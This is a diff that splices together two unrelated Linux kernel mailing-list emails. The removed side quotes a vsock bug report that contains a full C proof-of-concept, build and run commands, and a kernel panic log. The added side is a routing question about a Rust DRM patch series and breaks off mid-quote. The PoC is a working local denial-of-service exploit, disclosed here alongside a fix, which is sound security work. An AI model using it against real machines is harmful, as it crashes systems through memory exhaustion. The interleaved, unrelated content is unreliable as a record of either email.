@@ -1,585 +1,251 @@
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
+Received: from out-183.mta0.migadu.com (out-183.mta0.migadu.com [91.218.175.183])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D783B40B0E4
-	for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 08:38:09 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.129.124
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 847FA3E638D
+	for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 08:39:17 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=91.218.175.183
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785227892; cv=none; b=j8wrbQgIrtihmCIPYEQhALjhwPOEeX14PPrcUD/XZ8hNe2pC7RcTmhNH2DavxAaALNHGSleCCMwnJlbbSGYkdC/yesr9Y+w+dfqjZSsY1LxThxE0RQ+gsAT45dYQrgPqYp3ArkYOZ0VdHqPZ3/3sdTVthCEh1zWsIOGk8MRgQsA=
+	t=1785227959; cv=none; b=SAvgaZyN/dPXbN5aDOAsJjEukqfqaPeQn+0ZkX3hQe4XCFkyxoOC41OsQauZamZkbWTQqYdutQuKTMqYk+cuWTPhKBnl4tvXEzf4pxtQtj2QthbeABZ+qFKYfmf/5Jqg9Y98abloXndbYQko+R+EXpQpFqaUSgDgSSNECd7+jqM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785227892; c=relaxed/simple;
-	bh=43DrZt6ejn6FUfsxCEvgKE5UKB3ys9DkGvgfz3Mi4jI=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=ULxTFEpuG7M2+j/YFjhqiv/Q9PxZFBBhBf3WoKKSwD7Lbtaf/d4zxcK7trRaam2KT4UGY8rjcUf82F/h7jXb9s+h5I6m9WzFF6MkjiLmRMAgLGT0rL6QkDJDdgRiCfgEv4JWkUwQUb1q4MLJqpIHQ6otHUhTa1vE5TQUuP43ZJY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=K/oYjngt; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=DVKywe2l; arc=none smtp.client-ip=170.10.129.124
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
+	s=arc-20240116; t=1785227959; c=relaxed/simple;
+	bh=CRg/Nh54HZ99tMwpElMnVNEMdGg+zKH3+U7LRFD/tYE=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=bqBHKO1dwoD2r2Oj8kVI02H1qOFidffjnjySXDiMMsdD5QV5ms+VR//BLDBqO/SY2yCjiDzeMud/EbVBkb/JFhn10M1Iy+P2pD0DlyHIloZZ6WtKGFRPQDVZZLPiwuwB1AVBhI3O5vezQy5okTe+dV0PWlV4Z9BMHmOkvuAVWl0=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev; spf=pass smtp.mailfrom=linux.dev; dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b=D+tASYGg; arc=none smtp.client-ip=91.218.175.183
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.dev
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="K/oYjngt";
-	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="DVKywe2l"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1785227888;
+	dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b="D+tASYGg"
+Message-ID: <a9dde63a-5f2d-494b-95dd-7567879de38d@linux.dev>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linux.dev; s=key1;
+	t=1785227954;
 	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
 	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
 	 in-reply-to:in-reply-to:references:references;
-	bh=CM7SzTFkXyrhYH5cGOD06rBFksV47W6VIi5euG6/i2I=;
-	b=K/oYjngtdyledZUO5yhsRCzV6fQMpsQSsRfWRbsShmtXu7Ie1v+r4HtZ3cFkb8LRN0KBe1
-	UuNnJfVRQgAsbWMBcP02p1yCMJWWOJSL8F5ksR+BAzSEFih9AhU1fih+PgizFGgYjSn3GG
-	CstHOYN7y9rrqGkYSHIs7l32bbEWKZQ=
-Received: from mail-wm1-f70.google.com (mail-wm1-f70.google.com
- [209.85.128.70]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
- us-mta-433-jAa5HDr8P5qmkdVrvGTnXg-1; Tue, 28 Jul 2026 04:38:07 -0400
-X-MC-Unique: jAa5HDr8P5qmkdVrvGTnXg-1
-X-Mimecast-MFC-AGG-ID: jAa5HDr8P5qmkdVrvGTnXg_1785227886
-Received: by mail-wm1-f70.google.com with SMTP id 5b1f17b1804b1-492488f8583so33064905e9.2
-        for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 01:38:07 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=redhat.com; s=google; t=1785227886; x=1785832686; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=CM7SzTFkXyrhYH5cGOD06rBFksV47W6VIi5euG6/i2I=;
-        b=DVKywe2l97a6wnubG0vbIBa0g3Z4EW8eECFTnujqMp+Ob16jem8iCXVYUQkWqvoo0d
-         uicOl7TEGzx+2HIlbubRp5cmrXhMNTfWHxwF+HwygkauTMk9BsxXexvGD3g+Hc58WvLK
-         STTIoBS3KeqxNmObiG1dyubmUhHIttEmDu6iaSuXXtduh21xZVNjaVoIdXcW/YcJlCbl
-         LFRv/QnY27o40SPw2KVdQXm6yvezcDElX8eCQinVqdGvs24KeIBqQ+N+6JtheEj2B4bB
-         zWJrhUN1MuGII2aiKslsrVf7WBZf+kmFUKFf5iuj6cpBabojFzvoJtJ/cWAf5+L2+oUE
-         4izw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785227886; x=1785832686;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=CM7SzTFkXyrhYH5cGOD06rBFksV47W6VIi5euG6/i2I=;
-        b=pfI5zYhuu9G7GRrWhSuz8diw1x3LhFx0pVsu81qstBmuSvCiEwBKDqhHvi6oWS3MAE
-         g4S1BE2Ala6YK61dA6sYjlFAQgVfVNhHu/aKCupCHHz2hQRHqM1SBoCVcKpDgw27/m/z
-         xveSwWL4kRt+0EUtMfwGkyX5NCPDM3pKdpIYoJ06gWhmTbb2OUEAZkjRL4IlNuklDpB+
-         6FeJpnfV3JDibIb3q+s1yTdRQGcFQ/lqE2yfP7kRLTPVRpw7PwrZcaJh4xxXCDuCCd6v
-         Q603gkdPhEz+yE0j2CXPHKKNT7SpOT0ePVRfuP/RLiVKBl4PncKdQW+7Doy7rxzwFfvZ
-         +RVA==
-X-Forwarded-Encrypted: i=1; AHgh+RobxQChsZaCIHqliv5W7y/VIG9/kU355/SQOdJj0yjxi1aUEfj/s9gbFYTaV3csDOLDv/6vBtQ=@vger.kernel.org
-X-Gm-Message-State: AOJu0Ywc9Sga9dsRXrT+AkdzHul3VLz7/E+cqE7VUuVDpMEaXTyejtL5
-	zLeA16gn0OGN9zb5mlRGW0QqzPezBaBnHqAqgA23AsqfFgzYyh//v7dBBH+WT34Uo23raAjkWS0
-	meHV83xL2qFLUpUwlVMRKWYHZ8ttxI70Pkx81UQxqMJinyruhqiu0b8q6Xw==
-X-Gm-Gg: AR+sD11jLB4e6zvwwNwHCX5nw3sb1MCXBw8nT9vbcoYv6w83TaMXz5QZbZgC5GX+ksc
-	G4nNn6dOCZ75sP4T22OV7cSof3ZFFubv0Ukhv0t8jwJs9B2dXuCz6uY5BrFAdLnlMeCIqj/R2mG
-	8h607Mdg3poYGgFGIpY5Wu+TqjXXzGWC+Q6a+tH8NqdkEDksgBF+u/AHa0dq/rGp6smSiGcqmj5
-	AHKjPFMh26LoKrXoLFIAgSSGJOZ5S7GAoZ5eMIoEZjAxgI0OlAUQy8vWZBHqU3m+uGv6I7VeqYu
-	0dVzfQ21eb4sLgH7EvrouS9SvoIr4n7V4mK3hsOchHpmgGDfqXKzL7olMRJypgyWV1n8zTNguZE
-	CWctYlLzGlMYC/s6KqMSNuJ5gC5xvrDgFLcZGRSLuIcs=
-X-Received: by 2002:a05:600c:3115:b0:495:4e1d:82df with SMTP id 5b1f17b1804b1-496c642c72amr15111805e9.10.1785227885824;
-        Tue, 28 Jul 2026 01:38:05 -0700 (PDT)
-X-Received: by 2002:a05:600c:3115:b0:495:4e1d:82df with SMTP id 5b1f17b1804b1-496c642c72amr15111385e9.10.1785227885287;
-        Tue, 28 Jul 2026 01:38:05 -0700 (PDT)
-Received: from sgarzare-redhat (ip139-137-192-82.pool-bba.aruba.it. [82.192.137.139])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-496c44b84edsm93633145e9.5.2026.07.28.01.38.03
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 28 Jul 2026 01:38:04 -0700 (PDT)
-Date: Tue, 28 Jul 2026 10:37:59 +0200
-From: Stefano Garzarella <sgarzare@redhat.com>
-To: Ren Wei <enjou1224z@gmail.com>
-Cc: virtualization@lists.linux.dev, netdev@vger.kernel.org, 
-	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, horms@kernel.org, 
-	dtor@vmware.com, georgezhang@vmware.com, acking@vmware.com, vega@nebusec.ai, 
-	zihanx@nebusec.ai
-Subject: Re: [PATCH net 0/1] vsock: clear stale sk_err before listen()
-Message-ID: <amhpGj8ikeyfYazT@sgarzare-redhat>
-References: <cover.1784649300.git.zihanx@nebusec.ai>
+	bh=QbXjOIDNQAqLnMcNmNhhIkcZFnXKaj7v9jSB+IKjoGY=;
+	b=D+tASYGgBFHhUl7vxy1SvTJuUlL1fyINBlClOvQ9K4T3edtuSqXNpaYIxcusYBqtHtCGKn
+	4YFV+wfUruytiAPKlK/iMkIxiHxJeSoVj5BDR22K0phFcndN0nozhMJatVZeJF2M3nsdd0
+	JVFwwEIRGf5pB3U4V6tfCHcV69RCL/I=
+Date: Tue, 28 Jul 2026 16:38:44 +0800
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Disposition: inline
-In-Reply-To: <cover.1784649300.git.zihanx@nebusec.ai>
+Subject: Re: [PATCH v9 00/10] Fix missing fops.owner in Rust DRM/misc
+ abstractions
+To: Miguel Ojeda <ojeda@kernel.org>
+Cc: rust-for-linux@vger.kernel.org, linux-modules@vger.kernel.org,
+ driver-core@lists.linux.dev, dri-devel@lists.freedesktop.org,
+ nova-gpu@lists.linux.dev, linux-kselftest@vger.kernel.org,
+ kunit-dev@googlegroups.com, linux-block@vger.kernel.org,
+ linux-kernel@vger.kernel.org, netdev@vger.kernel.org,
+ linux-pci@vger.kernel.org, Boqun Feng <boqun@kernel.org>,
+ Gary Guo <gary@garyguo.net>, =?UTF-8?Q?Bj=C3=B6rn_Roy_Baron?=
+ <bjorn3_gh@protonmail.com>, Benno Lossin <lossin@kernel.org>,
+ Andreas Hindborg <a.hindborg@kernel.org>, Alice Ryhl <aliceryhl@google.com>,
+ Trevor Gross <tmgross@umich.edu>, Danilo Krummrich <dakr@kernel.org>,
+ Luis Chamberlain <mcgrof@kernel.org>, Petr Pavlu <petr.pavlu@suse.com>,
+ Daniel Gomez <da.gomez@kernel.org>, Sami Tolvanen <samitolvanen@google.com>,
+ Aaron Tomlin <atomlin@atomlin.com>,
+ Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
+ "Rafael J. Wysocki" <rafael@kernel.org>, David Airlie <airlied@gmail.com>,
+ Simona Vetter <simona@ffwll.ch>,
+ Daniel Almeida <daniel.almeida@collabora.com>, Arnd Bergmann
+ <arnd@arndb.de>, Brendan Higgins <brendan.higgins@linux.dev>,
+ David Gow <david@davidgow.net>, Rae Moar <raemoar63@gmail.com>,
+ Breno Leitao <leitao@debian.org>, Jens Axboe <axboe@kernel.dk>,
+ Dave Ertman <david.m.ertman@intel.com>, Leon Romanovsky <leon@kernel.org>,
+ Igor Korotin <igor.korotin@linux.dev>,
+ FUJITA Tomonori <fujita.tomonori@gmail.com>,
+ Bjorn Helgaas <bhelgaas@google.com>,
+ =?UTF-8?Q?Krzysztof_Wilczy=C5=84ski?= <kwilczynski@kernel.org>,
+ =?UTF-8?Q?Arve_Hj=C3=B8nnev=C3=A5g?= <arve@android.com>,
+ Todd Kjos <tkjos@android.com>, Christian Brauner <brauner@kernel.org>,
+ Carlos Llamas <cmllamas@google.com>
+References: <20260723-fix-fops-owner-v9-0-c1c3af7f7bcb@linux.dev>
+X-Report-Abuse: Please report any abuse attempt to abuse@migadu.com and include these headers.
+From: Alvin Sun <alvin.sun@linux.dev>
+In-Reply-To: <20260723-fix-fops-owner-v9-0-c1c3af7f7bcb@linux.dev>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+X-Migadu-Flow: FLOW_OUT
 
-On Fri, Jul 24, 2026 at 01:21:13AM +0800, Ren Wei wrote:
->From: Zihan Xi <zihanx@nebusec.ai>
->
->Hi Linux kernel maintainers,
->
->We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
->reachable by an unprivileged local user via AF_VSOCK loopback. We've
->tested it, and it should not affect any other functionality.
+Hi Miguel,
 
-Please check the following patches under discusion that seem related to 
-the issue you are reporting:
-- https://lore.kernel.org/virtualization/20260719220103.684489-1-phind.uet@gmail.com/
-- https://lore.kernel.org/virtualization/20260727071305.45826-1-phind.uet@gmail.com/
+Back in v3, Gary suggested this series go via the rust tree.
+Would you be happy with that, or would you prefer a different
+path? If so, is there anything else needed from my side?
 
-If you test it, please send a Tested-by
+Best regards,
+Alvin
 
-Thanks,
-Stefano
-
->
->This series contains one patch:
->  1/1 vsock: clear stale sk_err before listen()
->
->We provide bug details, reproducer steps, and a crash log below.
->
->---- details below ----
->
->Bug details:
->
->A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
->socket. If userspace then calls listen() on the same socket, the stale
->error remains attached to the listener. A later child can still reach the
->accept queue, but vsock_accept() sees listener->sk_err, rejects the
->child, and drops only the transient accept reference.
->
->On the virtio loopback path that rejected child can remain orphaned in the
->vsock tables, so repeated iterations leak children and can eventually
->push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
->failed connect() attempt from poisoning the next listener incarnation of
->that socket.
->
->On our fixed-kernel validation, the same minimal reproducer no longer hit
->that failed accept path and accept() returned a valid child socket.
->
->Reproducer:
->
->    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
->    echo 2 > /proc/sys/vm/panic_on_oom
->    echo 1 > /proc/sys/vm/oom_dump_tasks
->    /root/poc 100 44000 54000 33554432 33554432 600
->
->We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
->
->------BEGIN poc.c------
->
->#define _GNU_SOURCE
->
->#include <arpa/inet.h>
->#include <errno.h>
->#include <linux/vm_sockets.h>
->#include <pthread.h>
->#include <signal.h>
->#include <stdbool.h>
->#include <stdint.h>
->#include <stdio.h>
->#include <stdlib.h>
->#include <string.h>
->#include <sys/socket.h>
->#include <sys/time.h>
->#include <sys/types.h>
->#include <time.h>
->#include <unistd.h>
->
->#define DEFAULT_BASE_PORT 40000U
->#define DEFAULT_FAIL_PORT 50000U
->#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
->#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
->#define DEFAULT_ITERATIONS 1U
->
->struct client_ctx {
->	pthread_mutex_t lock;
->	pthread_cond_t cond;
->	unsigned int server_port;
->	unsigned int client_port;
->	unsigned long long send_bytes;
->	unsigned long long bytes_sent;
->	int connect_errno;
->	int send_errno;
->	int sent_any;
->	int connected;
->	int done;
->	int fd;
->};
->
->static void die(const char *msg)
->{
->	perror(msg);
->	exit(EXIT_FAILURE);
->}
->
->static void set_vsock_u64(int fd, int optname, unsigned long long val)
->{
->	if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
->		die("setsockopt(AF_VSOCK)");
->}
->
->static void set_connect_timeout(int fd, long sec)
->{
->	struct timeval tv = {
->		.tv_sec = sec,
->		.tv_usec = 0,
->	};
->
->	if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
->		       &tv, sizeof(tv)) < 0) {
->		die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
->	}
->}
->
->static void bind_vsock(int fd, unsigned int cid, unsigned int port)
->{
->	struct sockaddr_vm svm = {
->		.svm_family = AF_VSOCK,
->		.svm_cid = cid,
->		.svm_port = port,
->	};
->
->	if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
->		die("bind(AF_VSOCK)");
->}
->
->static int connect_vsock_errno(int fd, unsigned int cid, unsigned int port)
->{
->	struct sockaddr_vm svm = {
->		.svm_family = AF_VSOCK,
->		.svm_cid = cid,
->		.svm_port = port,
->	};
->
->	if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) == 0)
->		return 0;
->
->	return errno;
->}
->
->static void *client_thread(void *arg)
->{
->	struct client_ctx *ctx = arg;
->	char *buf;
->	unsigned long long sent = 0;
->	const size_t chunk = 64 * 1024;
->	int fd;
->	int err;
->
->	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
->	if (fd < 0)
->		die("client socket(AF_VSOCK)");
->
->	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes);
->	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
->	bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);
->
->	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_port);
->
->	pthread_mutex_lock(&ctx->lock);
->	ctx->fd = fd;
->	ctx->connect_errno = err;
->	ctx->connected = (err == 0);
->	pthread_cond_broadcast(&ctx->cond);
->	pthread_mutex_unlock(&ctx->lock);
->
->	if (err)
->		return NULL;
->
->	buf = malloc(chunk);
->	if (!buf)
->		die("malloc");
->	memset(buf, 'A', chunk);
->
->	while (sent < ctx->send_bytes) {
->		size_t todo = chunk;
->		ssize_t rc;
->
->		if (ctx->send_bytes - sent < todo)
->			todo = ctx->send_bytes - sent;
->
->		rc = send(fd, buf, todo, 0);
->		if (rc < 0) {
->			pthread_mutex_lock(&ctx->lock);
->			ctx->send_errno = errno;
->			pthread_mutex_unlock(&ctx->lock);
->			break;
->		}
->
->		if (rc == 0)
->			break;
->
->		sent += rc;
->		pthread_mutex_lock(&ctx->lock);
->		ctx->sent_any = 1;
->		ctx->bytes_sent = sent;
->		pthread_cond_broadcast(&ctx->cond);
->		pthread_mutex_unlock(&ctx->lock);
->	}
->
->	free(buf);
->
->	pthread_mutex_lock(&ctx->lock);
->	ctx->done = 1;
->	pthread_cond_broadcast(&ctx->cond);
->	pthread_mutex_unlock(&ctx->lock);
->
->	return NULL;
->}
->
->static void client_ctx_init(struct client_ctx *ctx, unsigned int server_port,
->			    unsigned int client_port,
->			    unsigned long long send_bytes)
->{
->	memset(ctx, 0, sizeof(*ctx));
->	pthread_mutex_init(&ctx->lock, NULL);
->	pthread_cond_init(&ctx->cond, NULL);
->	ctx->server_port = server_port;
->	ctx->client_port = client_port;
->	ctx->send_bytes = send_bytes;
->	ctx->fd = -1;
->}
->
->static void client_ctx_destroy(struct client_ctx *ctx)
->{
->	pthread_mutex_destroy(&ctx->lock);
->	pthread_cond_destroy(&ctx->cond);
->}
->
->static int wait_for_connect(struct client_ctx *ctx)
->{
->	int err;
->
->	pthread_mutex_lock(&ctx->lock);
->	while (!ctx->connected && ctx->connect_errno == 0)
->		pthread_cond_wait(&ctx->cond, &ctx->lock);
->	err = ctx->connect_errno;
->	pthread_mutex_unlock(&ctx->lock);
->
->	return err;
->}
->
->static void wait_for_send_progress(struct client_ctx *ctx)
->{
->	struct timespec ts;
->
->	clock_gettime(CLOCK_REALTIME, &ts);
->	ts.tv_sec += 2;
->	if (ts.tv_nsec >= 1000000000L) {
->		ts.tv_sec += 1;
->		ts.tv_nsec -= 1000000000L;
->	}
->
->	pthread_mutex_lock(&ctx->lock);
->	if (!ctx->done)
->		pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
->	pthread_mutex_unlock(&ctx->lock);
->}
->
->static int prepare_listener(unsigned int server_port, unsigned int fail_port,
->			    unsigned long long buffer_size)
->{
->	int fd;
->	int err;
->
->	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
->	if (fd < 0)
->		die("listener socket(AF_VSOCK)");
->
->	set_connect_timeout(fd, 1);
->	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
->	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
->	bind_vsock(fd, VMADDR_CID_LOCAL, server_port);
->
->	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
->	if (err == 0) {
->		fprintf(stderr, "unexpected successful failed-connect setup on port %u\n",
->			fail_port);
->		exit(EXIT_FAILURE);
->	}
->
->	fprintf(stderr, "[*] setup connect() failed with errno=%d (%s)\n",
->		err, strerror(err));
->
->	if (listen(fd, 1) < 0)
->		die("listen(AF_VSOCK)");
->
->	return fd;
->}
->
->static int trigger_once(unsigned int server_port, unsigned int fail_port,
->			unsigned int client_port,
->			unsigned long long buffer_size,
->			unsigned long long send_bytes)
->{
->	struct client_ctx ctx;
->	pthread_t tid;
->	int listener_fd;
->	int accept_fd;
->	int accept_errno;
->
->	listener_fd = prepare_listener(server_port, fail_port, buffer_size);
->
->	client_ctx_init(&ctx, server_port, client_port, send_bytes);
->	if (pthread_create(&tid, NULL, client_thread, &ctx) != 0)
->		die("pthread_create");
->
->	if (wait_for_connect(&ctx) != 0) {
->		fprintf(stderr, "client connect failed with errno=%d (%s)\n",
->			ctx.connect_errno, strerror(ctx.connect_errno));
->		exit(EXIT_FAILURE);
->	}
->
->	wait_for_send_progress(&ctx);
->
->	accept_fd = accept(listener_fd, NULL, NULL);
->	accept_errno = errno;
->
->	fprintf(stderr, "[*] accept() returned fd=%d errno=%d (%s)\n",
->		accept_fd, accept_errno, strerror(accept_errno));
->
->	if (accept_fd >= 0) {
->		fprintf(stderr, "unexpected successful accept()\n");
->		exit(EXIT_FAILURE);
->	}
->
->	if (accept_errno != ECONNRESET) {
->		fprintf(stderr, "unexpected accept errno: %d (%s)\n",
->			accept_errno, strerror(accept_errno));
->		exit(EXIT_FAILURE);
->	}
->
->	close(listener_fd);
->
->	pthread_join(tid, NULL);
->
->	fprintf(stderr,
->		"[*] client connect errno=%d send errno=%d bytes_sent=%llu sent_any=%d done=%d\n",
->		ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
->		ctx.sent_any, ctx.done);
->	accept_fd = ctx.fd;
->	ctx.fd = -1;
->	client_ctx_destroy(&ctx);
->	return accept_fd;
->}
->
->static unsigned int parse_u32(const char *s)
->{
->	unsigned long long v = strtoull(s, NULL, 0);
->
->	if (v > UINT32_MAX) {
->		fprintf(stderr, "value too large: %s\n", s);
->		exit(EXIT_FAILURE);
->	}
->
->	return (unsigned int)v;
->}
->
->static unsigned long long parse_u64(const char *s)
->{
->	return strtoull(s, NULL, 0);
->}
->
->int main(int argc, char **argv)
->{
->	unsigned int iterations = DEFAULT_ITERATIONS;
->	unsigned int base_port = DEFAULT_BASE_PORT;
->	unsigned int fail_base = DEFAULT_FAIL_PORT;
->	unsigned long long buffer_size = DEFAULT_BUFFER_SIZE;
->	unsigned long long send_bytes = DEFAULT_SEND_BYTES;
->	unsigned int hold_seconds = 0;
->	int *held_fds;
->	unsigned int i;
->
->	signal(SIGPIPE, SIG_IGN);
->
->	if (argc > 1)
->		iterations = parse_u32(argv[1]);
->	if (argc > 2)
->		base_port = parse_u32(argv[2]);
->	if (argc > 3)
->		fail_base = parse_u32(argv[3]);
->	if (argc > 4)
->		buffer_size = parse_u64(argv[4]);
->	if (argc > 5)
->		send_bytes = parse_u64(argv[5]);
->	if (argc > 6)
->		hold_seconds = parse_u32(argv[6]);
->
->	held_fds = calloc(iterations, sizeof(*held_fds));
->	if (!held_fds)
->		die("calloc");
->
->	for (i = 0; i < iterations; i++)
->		held_fds[i] = -1;
->
->	fprintf(stderr,
->		"[*] iterations=%u base_port=%u fail_base=%u buffer_size=%llu send_bytes=%llu hold_seconds=%u\n",
->		iterations, base_port, fail_base, buffer_size, send_bytes,
->		hold_seconds);
->
->	for (i = 0; i < iterations; i++) {
->		unsigned int server_port = base_port + (i * 2);
->		unsigned int client_port = base_port + (i * 2) + 1;
->		unsigned int fail_port = fail_base + i;
->
->		fprintf(stderr,
->			"[*] iteration=%u server_port=%u client_port=%u fail_port=%u\n",
->			i, server_port, client_port, fail_port);
->		held_fds[i] = trigger_once(server_port, fail_port, client_port,
->					   buffer_size, send_bytes);
->		fprintf(stderr, "[*] holding client fd=%d\n", held_fds[i]);
->	}
->
->	if (hold_seconds) {
->		fprintf(stderr, "[*] sleeping for %u seconds with client sockets open\n",
->			hold_seconds);
->		sleep(hold_seconds);
->	}
->
->	for (i = 0; i < iterations; i++) {
->		if (held_fds[i] >= 0)
->			close(held_fds[i]);
->	}
->
->	free(held_fds);
->
->	return 0;
->}
->
->------END poc.c--------
->
->----BEGIN crash log----
->
->[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
->[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.12.74 #3
->[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
->[  921.944405][T10458] Call Trace:
->[  921.944701][T10458]  <TASK>
->[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
->[  921.945423][T10458]  panic+0x6fe/0x7e0
->[  921.945802][T10458]  ? dump_header+0x6c2/0x950
->[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
->[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
->[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
->[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
->[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
->[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
->[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
->[  921.959719][T10458]  filemap_fault+0x675/0x2800
->[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
->[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
->[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
->[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
->[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
->[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
->[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
->[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b220d.
->[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
->[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: 00007f47a0942c8e
->[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: 0000000000000016
->[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: 0000000000000000
->[  921.974428][T10458]  </TASK>
->[  921.974959][T10458] Kernel Offset: disabled
->[  921.975445][T10458] Rebooting in 86400 seconds..
->
->-----END crash log-----
->
->Best regards,
->Zihan Xi
->
->Zihan Xi (1):
->  vsock: clear stale sk_err before listen()
->
-> net/vmw_vsock/af_vsock.c | 4 ++++
-> 1 file changed, 4 insertions(+)
->
->-- 
->2.43.0
->
-
+On 7/23/26 10:10, Alvin Sun wrote:
+> During tyr debugfs development, a kernel NULL pointer dereference was
+> encountered after `rmmod tyr` while gnome-shell still held /dev/card1 open:
+>
+> ```
+>    [158827.868132] Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000
